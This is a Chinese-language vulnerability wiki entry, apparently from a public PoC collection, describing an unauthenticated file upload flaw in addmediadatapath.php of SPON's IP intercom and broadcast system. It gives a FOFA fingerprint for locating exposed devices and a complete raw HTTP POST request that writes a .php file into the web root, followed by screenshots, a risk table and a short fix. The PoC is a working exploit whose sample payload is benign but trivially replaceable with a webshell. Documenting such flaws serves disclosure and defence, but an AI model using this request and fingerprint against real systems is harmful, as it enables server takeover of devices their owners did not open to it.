# 世邦通信IP网络对讲广播系统addmediadatapath.php文件上传

# 漏洞描述

世邦通信IP网络对讲广播系统addmediadatapath.php处存在文件上传漏洞，未经身份认真可上传恶意代码导致，系统被控制，危害极大。

# 影响版本

IP网络对讲广播系统

# **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 是 | 已公开 | 已公开 | 已知 |

## 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 高 |
| 利用难度 | 低 |

# 漏洞复现

FOFA：icon_hash="-1830859634"

POC/EXP：

POST /php/addmediadatapath.php HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryYrqVrkjRl2AHEKXG 
Content-Length: 395
Connection: keep-alive

------WebKitFormBoundaryYrqVrkjRl2AHEKXG
Content-Disposition: form-data; name="subpath"

------WebKitFormBoundaryYrqVrkjRl2AHEKXG
Content-Disposition: form-data; name="fullpath"

C:\ICPAS\Wnmp\WWW\php
------WebKitFormBoundaryYrqVrkjRl2AHEKXG
Content-Disposition: form-data; name="file"; filename="test.php"
Content-Type: audio/mp3

123456
------WebKitFormBoundaryYrqVrkjRl2AHEKXG--

![image-20241105223035534](./.resource/世邦通信IP网络对讲广播系统addmediadatapath.php文件上传/media/image-20241105223035534.png)


![image-20241105223057129](./.resource/世邦通信IP网络对讲广播系统addmediadatapath.php文件上传/media/image-20241105223057129.png)


# 修复方案

关闭互联网暴露面或接口设置访问权限

升级至安全版本


---

> 来源：SourByte05/Vulnerability-Wiki-PoC（https://github.com/SourByte05/Vulnerability-Wiki-PoC）
